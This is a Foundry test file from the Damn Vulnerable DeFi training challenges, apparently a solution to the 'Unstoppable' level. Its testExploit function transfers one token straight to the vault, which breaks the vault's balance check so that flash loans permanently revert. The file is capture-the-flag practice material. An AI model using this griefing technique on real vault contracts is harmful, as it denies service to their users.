pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "lib/forge-std/src/console.sol";

interface CheatCodes {
    function addr(uint256) external returns (address);
}

import "DamnVulnerableDeFi/unstoppable/ReceiverUnstoppable.sol";
import {DamnValuableToken} from "DamnVulnerableDeFi/DamnValuableToken.sol";
import {UnstoppableVault} from "DamnVulnerableDeFi/unstoppable/UnstoppableVault.sol";

contract Unstoppable is Test {
    uint256 internal constant TOKENS_IN_VAULT = 1000000 ether;
    uint256 internal constant INITIAL_PLAYER_TOKEN_BALANCE = 100 ether;

    UnstoppableVault internal vault;
    ReceiverUnstoppable internal receiverContract;
    DamnValuableToken internal token;
    address payable internal deployer;
    address payable internal player;
    address payable internal someUser;

    function setUp() public {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        deployer = payable(vm.addr(1));
        player = payable(vm.addr(2));
        someUser = payable(vm.addr(3));

        vm.label(deployer, "Deployer");
        vm.label(someUser, "User");
        vm.label(player, "Player");

        token = new DamnValuableToken();
        vault = new UnstoppableVault(token, deployer, deployer);

        token.approve(address(vault), TOKENS_IN_VAULT);
        vault.deposit(TOKENS_IN_VAULT, address(deployer));

        token.transfer(player, INITIAL_PLAYER_TOKEN_BALANCE);

        assertEq(token.balanceOf(address(vault)), TOKENS_IN_VAULT);
        assertEq(
            token.balanceOf(address(player)),
            INITIAL_PLAYER_TOKEN_BALANCE
        );

        vm.startPrank(someUser);
        receiverContract = new ReceiverUnstoppable(address(vault));
        receiverContract.executeFlashLoan(10);
        vm.stopPrank();
        console.log(unicode"💣 Let's see if you can hack it... 💣");
    }

    function testExploit() public {
        /** CODE YOUR SOLUTION HERE */

        vm.prank(player);
        token.transfer(address(vault), 1);

        vm.expectRevert(UnstoppableVault.InvalidBalance.selector);
        success();
        console.log(unicode"🤩 Congratulations, you pwned it! 🤩");
    }

    function success() internal {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // It is no longer possible to execute flash loans
        vm.prank(someUser);
        receiverContract.executeFlashLoan(10);
        vm.stopPrank();
    }
}
